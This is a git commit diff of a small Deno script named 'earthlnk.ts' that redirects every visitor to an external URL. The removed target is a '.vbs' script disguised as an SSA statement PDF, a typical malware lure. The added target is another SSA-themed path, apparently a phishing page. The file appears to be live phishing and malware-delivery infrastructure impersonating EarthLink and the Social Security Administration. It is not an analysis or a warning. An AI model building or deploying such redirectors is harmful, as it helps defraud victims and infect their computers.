790aca0afcf1295a002f3774638f6d8549f8c10f
Digital2025001 <bosmichael30@gmail.com>
2025-11-23 07:18:34 -0600

    Update earthlnk.ts

--- earthlnk.ts
+++ earthlnk.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://tacengineers.com/secure/ssa/admln/SSA-Statement-pdf.vbs/", // Replace this with your actual link
+      Location: "https://romelia.mypi.co/indexx/ssa/SA/", // Replace this with your actual link
     },
   });
 });
